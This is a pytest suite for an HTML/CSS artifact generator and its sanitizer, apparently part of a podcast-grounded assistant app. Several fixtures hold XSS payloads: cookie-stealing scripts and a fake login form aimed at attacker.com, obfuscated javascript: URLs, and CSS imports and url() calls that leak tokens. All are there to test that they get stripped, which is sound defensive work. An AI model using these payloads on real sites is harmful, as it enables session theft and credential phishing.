"""Unit and integration tests for HTML/CSS artifact generation and security sanitization (Phase 6A).

This test suite verifies:
1. Valid artifact request endpoint.
2. Invalid or empty artifact request validation.
3. Nonexistent session error handling.
4. Successful mocked Pi-generated HTML/CSS parsing.
5. Malformed model response fallback handling.
6. Script and event-handler security sanitization.
7. Executable URL scheme rejection (javascript:, vbscript:).
8. Dangerous HTML element rejection (iframe, object, embed, meta, base, link).
9. Unsafe external CSS handling (@import, expression, remote url).
10. Preservation of harmless responsive HTML/CSS.
11. Artifact PostgreSQL persistence and GET retrieval.
12. Isolation between distinct sessions.
13. Compatibility with existing Ship 30 for 30 essay records.
14. Timeout and generation-error resilience.
15. Legitimate podcast citations when query warrants it.
16. No fabricated citations for generic requests.
"""

from datetime import datetime, timezone
import json
import re
from typing import Any, Dict, List
from unittest.mock import AsyncMock, MagicMock, patch
import uuid

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from backend.app.agent.exceptions import (
    PiAgentException,
    PiTimeoutError,
)
from backend.app.agent.pi_client import PiClient, PiGenerationResult
from backend.app.agent.skills.html_artifact import (
    HtmlArtifactOrchestrator,
    build_artifact_prompt,
    build_sandboxed_preview,
    generate_fallback_artifact,
    parse_model_artifact_output,
    sanitize_css,
    sanitize_html,
)
from backend.app.main import app
from backend.app.models.message import ChatMessage
from backend.app.models.session import ChatSession
from backend.app.repositories import create_message, create_session, list_messages_by_session
from backend.app.retrieval.schemas import (
    CitationSource,
    IndexCoverage,
    RetrievalResponse,
)
from backend.app.retrieval.service import SemanticRetrievalService
from backend.app.routes.sessions import get_html_artifact_orchestrator
from backend.app.schemas.artifact import (
    ArtifactGenerateRequest,
    ArtifactResponse,
)


def _mock_citation(
    title: str = "When to Hire Sales",
    guest: str = "Jason Lemkin",
    start_seconds: float = 135.0,
    content: str = "Founders should close their first 10 customers themselves before hiring sales reps.",
) -> CitationSource:
    """Helper to create a realistic mock CitationSource."""
    return CitationSource(
        episode_id=uuid.uuid4(),
        episode_title=title,
        episode_slug="jason-lemkin",
        guest_name=guest,
        chunk_id=uuid.uuid4(),
        chunk_index=0,
        content=content,
        char_start=0,
        char_end=len(content),
        start_seconds=start_seconds,
        end_seconds=start_seconds + 30.0,
        timestamp_label="02:15",
        youtube_url="https://www.youtube.com/watch?v=mock_video",
        timestamped_url=f"https://www.youtube.com/watch?v=mock_video&t={int(start_seconds)}s",
        cosine_distance=0.15,
        similarity_score=0.85,
    )


def _mock_coverage() -> IndexCoverage:
    """Helper to create realistic mock IndexCoverage."""
    return IndexCoverage(
        total_episodes=303,
        indexed_episodes=3,
        total_chunks=20369,
        indexed_chunks=200,
        model_name="nomic-embed-text",
        is_partial=True,
        description="Index covers 3 of 303 episodes.",
    )


# ---------------------------------------------------------------------------
# 1. Valid Artifact Request
# ---------------------------------------------------------------------------
def test_valid_artifact_request_endpoint(client: TestClient, db_session: Session):
    """POST /api/sessions/{session_id}/artifact accepts valid payload and returns 201 Created."""
    session = create_session(db=db_session, title="Artifact Test Session")

    mock_html = "<div class='hero'><h1>SaaS Platform</h1><button type='button'>Get Started</button></div>"
    mock_css = ".hero { padding: 2rem; } h1 { color: #111; }"
    mock_output = (
        "TITLE: SaaS Platform Hero\n"
        "```html\n"
        f"{mock_html}\n"
        "```\n"
        "```css\n"
        f"{mock_css}\n"
        "```\n"
    )

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=mock_output,
            provider="ollama",
            model="qwen2.5:1.5b",
            raw_events=[],
        )
    )

    test_orchestrator = HtmlArtifactOrchestrator(pi_client=mock_pi)
    app.dependency_overrides[get_html_artifact_orchestrator] = lambda: test_orchestrator

    try:
        response = client.post(
            f"/api/sessions/{session.id}/artifact",
            json={
                "prompt": "Create a modern SaaS landing page hero section with a call to action",
                "title": "SaaS Platform Hero",
                "artifact_type": "landing_page",
                "style_preferences": "modern, clean typography",
            },
        )
        assert response.status_code == 201
        data = response.json()
        assert data["session_id"] == str(session.id)
        assert data["title"] == "SaaS Platform Hero"
        assert data["artifact_type"] == "landing_page"
        assert "<div class=\"hero\">" in data["html"]
        assert ".hero" in data["css"]
        assert "<!DOCTYPE html>" in data["combined_preview"]
        assert data["status"] == "completed"
        assert "artifact_id" in data
    finally:
        app.dependency_overrides.pop(get_html_artifact_orchestrator, None)


# ---------------------------------------------------------------------------
# 2. Invalid or Empty Artifact Request
# ---------------------------------------------------------------------------
def test_invalid_or_empty_artifact_request(client: TestClient, db_session: Session):
    """POST /api/sessions/{session_id}/artifact rejects empty, whitespace, or invalid payloads with 422."""
    session = create_session(db=db_session, title="Validation Session")

    # Empty prompt string
    res1 = client.post(
        f"/api/sessions/{session.id}/artifact",
        json={"prompt": ""},
    )
    assert res1.status_code == 422

    # Whitespace-only prompt
    res2 = client.post(
        f"/api/sessions/{session.id}/artifact",
        json={"prompt": "    \n   "},
    )
    assert res2.status_code == 422

    # Missing prompt field completely
    res3 = client.post(
        f"/api/sessions/{session.id}/artifact",
        json={"title": "No Prompt"},
    )
    assert res3.status_code == 422


# ---------------------------------------------------------------------------
# 3. Nonexistent Session
# ---------------------------------------------------------------------------
def test_nonexistent_session_returns_404(client: TestClient, db_session: Session):
    """POST and GET endpoints return 404 when targeted session UUID does not exist."""
    missing_id = uuid.uuid4()

    # POST to missing session
    post_res = client.post(
        f"/api/sessions/{missing_id}/artifact",
        json={"prompt": "Build a dashboard layout"},
    )
    assert post_res.status_code == 404
    assert f"'{missing_id}' not found" in post_res.json()["detail"]

    # GET from missing session
    get_res = client.get(f"/api/sessions/{missing_id}/artifact")
    assert get_res.status_code == 404
    assert f"'{missing_id}' not found" in get_res.json()["detail"]


# ---------------------------------------------------------------------------
# 4. Successful Mocked Pi-Generated HTML/CSS
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_successful_mocked_pi_generation(db_session: Session):
    """Orchestrator cleanly parses code fences and returns completed response."""
    session = create_session(db=db_session, title="Pi Generation Session")

    mock_text = (
        "TITLE: Growth Strategy Dashboard\n\n"
        "Here is the requested dashboard layout:\n\n"
        "```html\n"
        "<main class='dashboard'>\n"
        "  <section class='metric-card'>\n"
        "    <h3>Retention Rate</h3>\n"
        "    <p class='value'>84%</p>\n"
        "  </section>\n"
        "</main>\n"
        "```\n\n"
        "```css\n"
        ".dashboard { display: grid; gap: 1rem; }\n"
        ".metric-card { padding: 1.5rem; background: #fff; }\n"
        "```\n"
    )

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=mock_text,
            provider="ollama",
            model="qwen2.5:1.5b",
            raw_events=[],
        )
    )

    orchestrator = HtmlArtifactOrchestrator(pi_client=mock_pi)
    res = await orchestrator.generate_artifact(
        session_id=session.id,
        prompt="Design a growth strategy dashboard with key retention metrics",
        db=db_session,
    )

    assert res.title == "Growth Strategy Dashboard"
    assert res.status == "completed"
    assert "<main class=\"dashboard\">" in res.html
    assert "84%" in res.html
    assert ".dashboard" in res.css
    assert "<!DOCTYPE html>" in res.combined_preview


# ---------------------------------------------------------------------------
# 5. Malformed Model Response Fallback Handling
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_malformed_model_response_applies_fallback(db_session: Session):
    """Model output lacking valid HTML/CSS code blocks triggers resilient fallback."""
    session = create_session(db=db_session, title="Fallback Session")

    # Output has no code blocks at all
    malformed_output = "I am an AI assistant and I think you should use HTML and CSS for your landing page."

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=malformed_output,
            provider="ollama",
            model="qwen2.5:1.5b",
            raw_events=[],
        )
    )

    orchestrator = HtmlArtifactOrchestrator(pi_client=mock_pi)
    res = await orchestrator.generate_artifact(
        session_id=session.id,
        prompt="Build a pricing card",
        title="Pricing Tier",
        artifact_type="component",
        db=db_session,
    )

    # Status marked as partial because fallback was used
    assert res.status == "partial"
    assert "applied structured layout components" in " ".join(res.diagnostics)
    # Fallback HTML and CSS are valid and populated
    assert "<div class=\"artifact-container\">" in res.html
    assert "Pricing Tier" in res.html
    assert ".artifact-card" in res.css


# ---------------------------------------------------------------------------
# 6. Script and Event-Handler Security Sanitization
# ---------------------------------------------------------------------------
def test_script_and_event_handler_sanitization():
    """Sanitizer strips <script> tags and all inline 'on*' event handlers."""
    dangerous_html = (
        "<div class='card' onclick=\"alert('XSS')\" onmouseover='fetchBad()'>"
        "  <h2>Product Title</h2>"
        "  <script>window.location='https://attacker.com/steal?cookie=' + document.cookie;</script>"
        "  <script src='https://attacker.com/script.js'></script>"
        "  <p>Safe product description.</p>"
        "  <button type='button' onload='bad()'>Buy Now</button>"
        "</div>"
    )

    cleaned, diags = sanitize_html(dangerous_html)

    # All script tags and their content must be gone
    assert "<script" not in cleaned.lower()
    assert "window.location" not in cleaned
    assert "attacker.com" not in cleaned

    # All on* event handlers must be stripped
    assert "onclick" not in cleaned.lower()
    assert "onmouseover" not in cleaned.lower()
    assert "onload" not in cleaned.lower()

    # Harmless content must remain intact
    assert "<h2>Product Title</h2>" in cleaned
    assert "<p>Safe product description.</p>" in cleaned
    assert "Buy Now" in cleaned
    assert len(diags) >= 3


# ---------------------------------------------------------------------------
# 7. Executable URL Scheme Rejection
# ---------------------------------------------------------------------------
def test_executable_url_rejection():
    """Sanitizer blocks javascript:, vbscript:, and data: HTML executable schemes."""
    dangerous_html = (
        "<div>"
        "  <a href='javascript:alert(1)'>Malicious Link</a>"
        "  <a href='vbscript:msgbox(1)'>VBScript Link</a>"
        "  <a href='  javascript:void(0)'>Obfuscated JS</a>"
        "  <a href='https://legit.com/product' target='_blank'>Legit Link</a>"
        "  <img src='javascript:alert(2)' alt='Bad Image'>"
        "  <a href='#features'>Internal Anchor</a>"
        "</div>"
    )

    cleaned, diags = sanitize_html(dangerous_html)

    assert "javascript:" not in cleaned.lower()
    assert "vbscript:" not in cleaned.lower()
    assert "href=\"https://legit.com/product\"" in cleaned
    assert "href=\"#features\"" in cleaned
    # Target _blank should have safe rel added
    assert "rel=\"noopener noreferrer\"" in cleaned
    assert any("Blocked executable URL scheme" in d for d in diags)


# ---------------------------------------------------------------------------
# 8. Dangerous HTML Element Rejection
# ---------------------------------------------------------------------------
def test_dangerous_html_element_rejection():
    """Sanitizer removes iframe, object, embed, meta, base, link, and form tags."""
    dangerous_html = (
        "<section>"
        "  <iframe src='https://attacker.com/embed'></iframe>"
        "  <object data='malware.swf'></object>"
        "  <embed src='plugin.pdf'>"
        "  <meta http-equiv='refresh' content='0;url=https://attacker.com'>"
        "  <base href='https://attacker.com/'>"
        "  <link rel='stylesheet' href='https://attacker.com/evil.css'>"
        "  <form action='https://attacker.com/login' method='POST'>"
        "    <input type='text' name='user' value='admin'>"
        "    <input type='submit' value='Login'>"
        "  </form>"
        "  <p>Legitimate text</p>"
        "</section>"
    )

    cleaned, diags = sanitize_html(dangerous_html)

    for disallowed in ("iframe", "object", "embed", "meta", "base", "link", "form"):
        assert f"<{disallowed}" not in cleaned.lower()
        assert f"</{disallowed}>" not in cleaned.lower()

    # Form submit button neutralized
    assert "type=\"submit\"" not in cleaned.lower()
    # Harmless text preserved
    assert "<p>Legitimate text</p>" in cleaned


# ---------------------------------------------------------------------------
# 9. Unsafe External Resource and CSS Handling
# ---------------------------------------------------------------------------
def test_unsafe_css_handling():
    """CSS sanitizer strips @import, expression(), -moz-binding, behavior, and remote URLs."""
    dangerous_css = (
        "@import url('https://attacker.com/keylogger.css');\n"
        "@import 'https://evil.org/leak.css';\n"
        ".box {\n"
        "  width: expression(alert('CSS XSS'));\n"
        "  -moz-binding: url('http://attacker.com/xbl.xml#test');\n"
        "  behavior: url('evil.htc');\n"
        "  background: url('javascript:alert(1)');\n"
        "  background-image: url('https://attacker.com/exfiltrate?q=token');\n"
        "  color: #333333;\n"
        "  display: flex;\n"
        "}\n"
    )

    cleaned, diags = sanitize_css(dangerous_css)

    assert "@import" not in cleaned
    assert "expression(" not in cleaned
    assert "-moz-binding" not in cleaned
    assert "behavior:" not in cleaned
    assert "javascript:" not in cleaned
    assert "https://attacker.com" not in cleaned

    # Valid properties preserved
    assert "color: #333333;" in cleaned
    assert "display: flex;" in cleaned
    assert len(diags) >= 4


# ---------------------------------------------------------------------------
# 10. Preservation of Harmless Responsive HTML/CSS
# ---------------------------------------------------------------------------
def test_preservation_of_harmless_responsive_html_css():
    """Sanitizers preserve legitimate semantic HTML5 elements and responsive CSS rules."""
    valid_html = (
        "<header class=\"nav-header\">\n"
        "  <nav aria-label=\"Main\">\n"
        "    <a href=\"#hero\" class=\"logo\">Oogway</a>\n"
        "    <ul class=\"nav-links\">\n"
        "      <li><a href=\"#features\">Features</a></li>\n"
        "      <li><a href=\"#pricing\">Pricing</a></li>\n"
        "    </ul>\n"
        "  </nav>\n"
        "</header>\n"
        "<main>\n"
        "  <article class=\"hero-section\">\n"
        "    <h1>Lenny Growth Assistant</h1>\n"
        "    <p>Accelerate go-to-market execution with verified podcast frameworks.</p>\n"
        "    <span class=\"badge\">Enterprise</span>\n"
        "    <button type=\"button\" class=\"btn-primary\">Get Started</button>\n"
        "  </article>\n"
        "</main>"
    )

    valid_css = (
        ":root { --primary-color: #4f46e5; }\n"
        ".nav-header { display: flex; justify-content: space-between; padding: 1rem 2rem; }\n"
        ".hero-section { max-width: 1200px; margin: 0 auto; text-align: center; }\n"
        "@media (max-width: 768px) {\n"
        "  .nav-header { flex-direction: column; }\n"
        "  .hero-section h1 { font-size: 1.75rem; }\n"
        "}"
    )

    cleaned_html, html_diags = sanitize_html(valid_html)
    cleaned_css, css_diags = sanitize_css(valid_css)

    # HTML semantic structure preserved
    assert "<header class=\"nav-header\">" in cleaned_html
    assert "<nav aria-label=\"Main\">" in cleaned_html
    assert "<span class=\"badge\">Enterprise</span>" in cleaned_html
    assert "btn-primary" in cleaned_html

    # CSS responsive structure preserved
    assert ":root" in cleaned_css
    assert "@media (max-width: 768px)" in cleaned_css
    assert "flex-direction: column;" in cleaned_css
    assert len(html_diags) == 0
    assert len(css_diags) == 0


# ---------------------------------------------------------------------------
# 10b. Untrusted SVG and MathML Strict Prohibition
# ---------------------------------------------------------------------------
def test_svg_and_mathml_completely_removed():
    """Untrusted SVG, MathML, their child elements, and SVG data URIs are completely stripped."""
    dangerous_markup = (
        "<div>\n"
        "  <h2>Dashboard Header</h2>\n"
        "  <svg viewBox=\"0 0 100 100\" width=\"100\">\n"
        "    <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\" />\n"
        "    <text>Untrusted SVG Text</text>\n"
        "    <script>alert('svg-xss')</script>\n"
        "    <foreignObject><iframe src=\"https://evil.com\"></iframe></foreignObject>\n"
        "  </svg>\n"
        "  <math xmlns=\"http://www.w3.org/1998/Math/MathML\">\n"
        "    <mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow>\n"
        "    <annotation encoding=\"application/x-tex\">x+y</annotation>\n"
        "  </math>\n"
        "  <img src=\"data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+\" alt=\"SVG Image\">\n"
        "  <p>Legitimate paragraph content.</p>\n"
        "</div>"
    )

    cleaned_html, diags = sanitize_html(dangerous_markup)

    # SVG and all descendants completely removed
    assert "<svg" not in cleaned_html.lower()
    assert "</svg>" not in cleaned_html.lower()
    assert "<circle" not in cleaned_html.lower()
    assert "Untrusted SVG Text" not in cleaned_html
    assert "svg-xss" not in cleaned_html
    assert "<foreignobject" not in cleaned_html.lower()

    # MathML and all descendants completely removed
    assert "<math" not in cleaned_html.lower()
    assert "</math>" not in cleaned_html.lower()
    assert "<mrow" not in cleaned_html.lower()
    assert "<annotation" not in cleaned_html.lower()

    # SVG data URI rejected from image src
    assert "image/svg+xml" not in cleaned_html

    # Legitimate content preserved
    assert "<h2>Dashboard Header</h2>" in cleaned_html
    assert "<p>Legitimate paragraph content.</p>" in cleaned_html
    assert len(diags) >= 2


# ---------------------------------------------------------------------------
# 10c. External Network Resource Loading Blocked & Strict CSP
# ---------------------------------------------------------------------------
def test_external_network_resource_loading_blocked():
    """Remote image URLs, external media, remote fonts, and remote stylesheets are blocked."""
    html_with_remote = (
        "<section>\n"
        "  <img src=\"https://evil.com/tracker.png\" alt=\"Remote Tracker\">\n"
        "  <img src=\"http://insecure.org/pic.jpg\" alt=\"HTTP Image\">\n"
        "  <img src=\"//cdn.example.com/asset.png\" alt=\"Protocol Relative\">\n"
        "  <audio src=\"https://stream.com/audio.mp3\"></audio>\n"
        "  <video src=\"https://stream.com/video.mp4\"></video>\n"
        "  <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\" alt=\"Safe 1x1 Pixel\">\n"
        "  <p>Safe content.</p>\n"
        "</section>"
    )

    css_with_remote = (
        "@import url('https://fonts.googleapis.com/css2?family=Roboto');\n"
        ".hero {\n"
        "  background-image: url('https://remote.com/background.jpg');\n"
        "  cursor: url('https://evil.com/cursor.cur'), auto;\n"
        "  color: #111827;\n"
        "}"
    )

    cleaned_html, html_diags = sanitize_html(html_with_remote)
    cleaned_css, css_diags = sanitize_css(css_with_remote)

    # Remote image URLs stripped
    assert "https://evil.com/tracker.png" not in cleaned_html
    assert "http://insecure.org/pic.jpg" not in cleaned_html
    assert "//cdn.example.com/asset.png" not in cleaned_html

    # Audio/video network elements stripped
    assert "<audio" not in cleaned_html
    assert "<video" not in cleaned_html

    # Safe raster 1x1 pixel data URI preserved
    assert "data:image/png;base64," in cleaned_html

    # Remote CSS font @import and remote background url() stripped
    assert "@import" not in cleaned_css
    assert "fonts.googleapis.com" not in cleaned_css
    assert "https://remote.com/background.jpg" not in cleaned_css
    assert "color: #111827;" in cleaned_css

    # Verify ultra-strict CSP in preview assembly
    preview = build_sandboxed_preview(html=cleaned_html, css=cleaned_css, title="Secure Preview")
    assert "default-src 'none';" in preview
    assert "img-src data:;" in preview
    assert "font-src 'none';" in preview
    assert "connect-src 'none';" in preview
    assert "https:" not in re.search(r"img-src [^;]+;", preview).group(0)
    assert "https:" not in re.search(r"font-src [^;]+;", preview).group(0)


# ---------------------------------------------------------------------------
# 10d. Obfuscated and Entity-Encoded Executable URLs
# ---------------------------------------------------------------------------
def test_obfuscated_and_encoded_executable_urls_rejected():
    """Sanitizer detects entity-encoded, whitespace-padded, and mixed-case executable URLs."""
    obfuscated_html = (
        "<div>\n"
        "  <a href=\"jav&#x09;ascript:alert('tab')\">Tab Obfuscation</a>\n"
        "  <a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('entity')\">Full Entities</a>\n"
        "  <a href=\"  javascript  :  alert('spaces')\">Whitespace Padded</a>\n"
        "  <a href=\"JaVaScRiPt:alert('mixed')\">Mixed Case</a>\n"
        "  <a href=\"vbscript:msgbox(1)\">VBScript</a>\n"
        "  <a href=\"#safe-anchor\">Safe Anchor</a>\n"
        "</div>"
    )

    cleaned, diags = sanitize_html(obfuscated_html)

    assert "javascript:" not in cleaned.lower()
    assert "vbscript:" not in cleaned.lower()
    assert 'href="vbscript' not in cleaned.lower()
    assert 'href="javascript' not in cleaned.lower()
    assert "href=\"#safe-anchor\"" in cleaned
    assert len(diags) >= 4


# ---------------------------------------------------------------------------
# 10e. Nested Malicious Content and Malformed HTML
# ---------------------------------------------------------------------------
def test_nested_malicious_content_and_malformed_html():
    """Sanitizer handles deeply nested forbidden elements and malformed unclosed tags safely."""
    nested_malformed = (
        "<div>\n"
        "  <form action=\"/submit\">\n"
        "    <svg><g><script>nestedScript()</script></g></svg>\n"
        "    <button type=\"submit\" onclick=\"attack()\">Submit</button>\n"
        "  </form>\n"
        "  <p>Text after form\n"
        "  <script>unclosedScript()\n"
        "  <div class=\"inner\">Safe Inner Text</div>\n"
        "</div>"
    )

    cleaned, diags = sanitize_html(nested_malformed)

    # Active scripting and handlers completely neutralized
    assert "<script" not in cleaned.lower()
    assert "nestedScript" not in cleaned
    assert "unclosedScript" not in cleaned
    assert "<form" not in cleaned.lower()
    assert "<svg" not in cleaned.lower()
    assert "onclick" not in cleaned.lower()
    assert "attack()" not in cleaned

    # Safe content located outside closed forbidden subtrees survives
    assert "Text after form" in cleaned
    assert "Submit" in cleaned

    # Content inside the unclosed forbidden script region is conservatively stripped
    assert "Safe Inner Text" not in cleaned
    assert "<div class=\"inner\"" not in cleaned


# ---------------------------------------------------------------------------
# 11. Artifact Persistence and Retrieval
# ---------------------------------------------------------------------------
def test_artifact_persistence_and_retrieval(client: TestClient, db_session: Session):
    """Artifact is persisted to PostgreSQL and reliably retrieved via GET endpoint."""
    session = create_session(db=db_session, title="Persistence Test Session")

    # Pre-populate artifact directly as assistant message
    artifact_meta = {
        "artifact_type": "html_artifact",
        "category": "dashboard",
        "title": "Onboarding Metrics Dashboard",
        "prompt": "Create an onboarding analytics view",
        "html": "<div class=\"dashboard-grid\"><h2>Funnel Conversion</h2></div>",
        "css": ".dashboard-grid { display: grid; }",
        "combined_preview": "<!DOCTYPE html><html><body>Preview</body></html>",
        "status": "completed",
        "diagnostics": [],
        "citations": [],
    }

    create_message(
        db=db_session,
        session_id=session.id,
        role="assistant",
        content="Generated Dashboard Artifact: Onboarding Metrics Dashboard",
        source_metadata=artifact_meta,
    )

    # GET /api/sessions/{session_id}/artifact
    response = client.get(f"/api/sessions/{session.id}/artifact")
    assert response.status_code == 200
    data = response.json()

    assert data["session_id"] == str(session.id)
    assert data["title"] == "Onboarding Metrics Dashboard"
    assert data["artifact_type"] == "dashboard"
    assert "Funnel Conversion" in data["html"]
    assert ".dashboard-grid" in data["css"]
    assert data["status"] == "completed"


# ---------------------------------------------------------------------------
# 12. Isolation Between Sessions
# ---------------------------------------------------------------------------
def test_isolation_between_sessions(client: TestClient, db_session: Session):
    """Artifacts are strictly isolated by session ID without cross-session leakage."""
    session_a = create_session(db=db_session, title="Session Alpha")
    session_b = create_session(db=db_session, title="Session Beta")
    session_empty = create_session(db=db_session, title="Session Empty")

    create_message(
        db=db_session,
        session_id=session_a.id,
        role="assistant",
        content="Artifact Alpha",
        source_metadata={
            "artifact_type": "html_artifact",
            "category": "landing_page",
            "title": "Alpha Landing Page",
            "html": "<div>Alpha</div>",
            "css": ".alpha { color: blue; }",
            "combined_preview": "Alpha Preview",
            "status": "completed",
        },
    )

    create_message(
        db=db_session,
        session_id=session_b.id,
        role="assistant",
        content="Artifact Beta",
        source_metadata={
            "artifact_type": "html_artifact",
            "category": "dashboard",
            "title": "Beta Dashboard",
            "html": "<div>Beta</div>",
            "css": ".beta { color: red; }",
            "combined_preview": "Beta Preview",
            "status": "completed",
        },
    )

    res_a = client.get(f"/api/sessions/{session_a.id}/artifact")
    assert res_a.status_code == 200
    assert res_a.json()["title"] == "Alpha Landing Page"

    res_b = client.get(f"/api/sessions/{session_b.id}/artifact")
    assert res_b.status_code == 200
    assert res_b.json()["title"] == "Beta Dashboard"

    # Empty session has no artifact
    res_empty = client.get(f"/api/sessions/{session_empty.id}/artifact")
    assert res_empty.status_code == 404
    assert f"No generated HTML/CSS artifact found for session '{session_empty.id}'" in res_empty.json()["detail"]


# ---------------------------------------------------------------------------
# 13. Compatibility With Existing Essay Records
# ---------------------------------------------------------------------------
def test_compatibility_with_existing_essay_records(client: TestClient, db_session: Session):
    """Session containing both an essay and an HTML artifact distinguishes both endpoints correctly."""
    session = create_session(db=db_session, title="Multi-Artifact Session")

    # 1. Store Ship 30 essay artifact
    create_message(
        db=db_session,
        session_id=session.id,
        role="assistant",
        content="# Jason Lemkin Essay\n\nClose 10 customers yourself.",
        source_metadata={
            "artifact_type": "ship30_essay",
            "title": "Jason Lemkin Founder Sales",
            "word_count": 1250,
            "status": "completed",
        },
    )

    # 2. Store HTML design artifact
    create_message(
        db=db_session,
        session_id=session.id,
        role="assistant",
        content="Generated HTML Artifact: Sales Playbook Page",
        source_metadata={
            "artifact_type": "html_artifact",
            "category": "landing_page",
            "title": "Sales Playbook Page",
            "html": "<div>Sales Playbook</div>",
            "css": ".sales { font-weight: bold; }",
            "combined_preview": "<!DOCTYPE html>Sales Page",
            "status": "completed",
        },
    )

    # Query Essay endpoint
    essay_res = client.get(f"/api/sessions/{session.id}/essay")
    assert essay_res.status_code == 200
    assert essay_res.json()["artifact_type"] == "ship30_essay"
    assert essay_res.json()["title"] == "Jason Lemkin Founder Sales"

    # Query HTML Artifact endpoint
    artifact_res = client.get(f"/api/sessions/{session.id}/artifact")
    assert artifact_res.status_code == 200
    assert artifact_res.json()["artifact_type"] == "landing_page"
    assert artifact_res.json()["title"] == "Sales Playbook Page"
    assert "Sales Playbook" in artifact_res.json()["html"]


# ---------------------------------------------------------------------------
# 14. Timeout and Generation-Error Handling
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_timeout_and_generation_error_handling(db_session: Session):
    """Pi timeout or agent exception is handled gracefully with partial status and diagnostics."""
    session = create_session(db=db_session, title="Timeout Resilience Session")

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        side_effect=PiTimeoutError("Pi generation exceeded 180 seconds")
    )

    orchestrator = HtmlArtifactOrchestrator(pi_client=mock_pi)
    res = await orchestrator.generate_artifact(
        session_id=session.id,
        prompt="Build a SaaS pricing calculator",
        title="Pricing Calculator",
        artifact_type="component",
        db=db_session,
    )

    assert res.status == "partial"
    assert any("timed out" in d for d in res.diagnostics)
    # Server did not crash; fallback HTML/CSS provided
    assert len(res.html) > 0
    assert len(res.css) > 0


# ---------------------------------------------------------------------------
# 15. Legitimate Podcast Citations
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_legitimate_podcast_citations_incorporated(db_session: Session):
    """When query requests Lenny podcast insights, evidence is retrieved and citations returned."""
    session = create_session(db=db_session, title="Podcast Grounded Artifact")
    citation = _mock_citation(
        title="Jason Lemkin on Founder-Led Sales",
        guest="Jason Lemkin",
        content="Founders must personally close 10 customers before delegating sales.",
    )

    mock_retrieval = MagicMock(spec=SemanticRetrievalService)
    mock_retrieval.retrieve.return_value = RetrievalResponse(
        query="Jason Lemkin podcast founder sales advice",
        status="success",
        items=[citation],
        coverage=_mock_coverage(),
        disclaimer=None,
    )

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=(
                "TITLE: Jason Lemkin Founder Sales Playbook\n"
                "```html\n"
                "<section class='playbook'><h1>Close 10 Customers First</h1></section>\n"
                "```\n"
                "```css\n"
                ".playbook { padding: 2rem; }\n"
                "```\n"
            ),
            provider="ollama",
            model="qwen2.5:1.5b",
            raw_events=[],
        )
    )

    orchestrator = HtmlArtifactOrchestrator(
        pi_client=mock_pi,
        retrieval_service=mock_retrieval,
    )

    res = await orchestrator.generate_artifact(
        session_id=session.id,
        prompt="Create a landing page summarizing Jason Lemkin's podcast advice on founder sales",
        include_podcast_context=True,
        db=db_session,
    )

    assert res.status == "completed"
    assert len(res.citations) == 1
    assert res.citations[0].guest_name == "Jason Lemkin"
    assert "https://www.youtube.com/watch" in res.citations[0].timestamped_url
    assert res.coverage is not None


# ---------------------------------------------------------------------------
# 16. No Fabricated Citations When Generic Request
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_no_fabricated_citations_when_generic_request(db_session: Session):
    """Generic styling/layout requests without podcast keywords do not invent citations."""
    session = create_session(db=db_session, title="Generic Layout Session")

    mock_retrieval = MagicMock(spec=SemanticRetrievalService)

    mock_pi = MagicMock(spec=PiClient)
    mock_pi.generate_response = AsyncMock(
        return_value=PiGenerationResult(
            text=(
                "TITLE: Generic Dark Modal\n"
                "```html\n"
                "<div class='modal'><h2>Confirm Action</h2></div>\n"
                "```\n"
                "```css\n"
                ".modal { background: #1f2937; color: #fff; }\n"
                "```\n"
            ),
            provider="ollama",
            model="qwen2.5:1.5b",
            raw_events=[],
        )
    )

    orchestrator = HtmlArtifactOrchestrator(
        pi_client=mock_pi,
        retrieval_service=mock_retrieval,
    )

    res = await orchestrator.generate_artifact(
        session_id=session.id,
        prompt="Create a simple dark confirmation modal component with cancel and confirm buttons",
        include_podcast_context=False,
        db=db_session,
    )

    # Retrieval service was not called for generic request
    mock_retrieval.retrieve.assert_not_called()
    assert len(res.citations) == 0
    assert res.coverage is None
    assert res.status == "completed"


# ---------------------------------------------------------------------------
# 17. UUID JSON-Mode Serialization in Metadata
# ---------------------------------------------------------------------------
def test_uuid_serialization_in_artifact_metadata():
    """Verify that CitationSource models with real UUIDs serialize cleanly in JSON mode."""
    citation = _mock_citation(
        title="Elena Verna on PLG Retention",
        guest="Elena Verna",
        content="Product-led growth loops require early activation hooks.",
    )

    # In raw model_dump(), episode_id and chunk_id remain uuid.UUID instances
    raw_dump = citation.model_dump()
    assert isinstance(raw_dump["episode_id"], uuid.UUID)
    assert isinstance(raw_dump["chunk_id"], uuid.UUID)

    # Python's json.dumps() fails on raw UUID objects
    with pytest.raises(TypeError, match="Object of type UUID is not JSON serializable"):
        json.dumps(raw_dump)

    # In JSON mode (mode="json"), all UUIDs are converted to strings
    json_mode_dump = citation.model_dump(mode="json")
    assert isinstance(json_mode_dump["episode_id"], str)
    assert isinstance(json_mode_dump["chunk_id"], str)

    # json.dumps() succeeds without error
    encoded = json.dumps(json_mode_dump)
    assert str(citation.episode_id) in encoded
    assert str(citation.chunk_id) in encoded


# ---------------------------------------------------------------------------
# 18. Artifact Persistence With Real Citations and GET Retrieval
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_artifact_persistence_with_real_citations(client: TestClient, db_session: Session):
